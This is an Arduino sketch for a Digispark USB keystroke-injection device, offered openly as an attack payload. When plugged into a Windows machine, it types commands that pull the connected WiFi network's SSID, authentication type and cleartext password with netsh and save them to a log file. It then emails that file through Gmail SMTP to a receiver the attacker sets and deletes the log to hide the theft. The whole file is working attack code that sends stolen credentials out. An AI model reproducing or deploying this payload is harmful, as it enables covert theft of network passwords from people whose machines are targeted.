// This payload:

// Opens CMD
// Finds the key (password) of the WiFi the target is connected to
// Saves the SSID, Network type, Authentication and the key to Log.txt
// And emails Log.txt via gmail

// Change the following things;

// ACCOUNT: Your gmail account
// PASSWORD: Your gmail password
// RECEIVER: The email you want to send Log.txt to
#include "DigiKeyboard.h"
void setup(){}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(7, 8);
  // --> Open cmd
  DigiKeyboard.sendKeyStroke(21, 8);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(1000);
  // --> Change directory (you can change this to something else to make less visible)
  DigiKeyboard.print("cd "%USERPROFILE%\Desktop"");
  DigiKeyboard.sendKeyStroke(40);
  // --> Get SSID
  DigiKeyboard.print("for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set SSID=%A");
  DigiKeyboard.sendKeyStroke(40);
  // --> Get network type
  DigiKeyboard.print("netsh wlan show profiles %SSID% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">Temp.txt");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set NETTYPE=%A");
  DigiKeyboard.sendKeyStroke(40);
  // --> Get authentication
  DigiKeyboard.print("netsh wlan show profiles %SSID% | findstr "Authentication">Temp.txt");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set AUTH=%A");
  DigiKeyboard.sendKeyStroke(40);
  // --> Get key
  DigiKeyboard.print("netsh wlan show profiles %SSID% key=clear | findstr "Key Content">Temp.txt");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set KEY=%A");
  DigiKeyboard.sendKeyStroke(40);
  // --> Delete Temp.txt
  DigiKeyboard.print("del Temp.txt");
  DigiKeyboard.sendKeyStroke(40);
  // --> Create Log.txt
  DigiKeyboard.print("echo SSID: %SSID%>>Log.txt & echo Network type: %NETTYPE%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt");
  DigiKeyboard.sendKeyStroke(40);
  // --> Mail Log.txt
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$SMTPServer = 'smtp.gmail.com'");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$SMTPInfo.EnableSsl = $true");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD');");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail.From = 'ACCOUNT@gmail.com'");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail.To.Add('RECEIVER@gmail.com')");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail.Subject = 'WiFi'");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail.Body = 'The log is attached!'");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$ReportEmail.Attachments.Add('Log.txt')");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("$SMTPInfo.Send($ReportEmail)");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(40);
  // --> Delete Log.txt and exit
  DigiKeyboard.print("del Log.txt & exit");
  DigiKeyboard.sendKeyStroke(40);
}
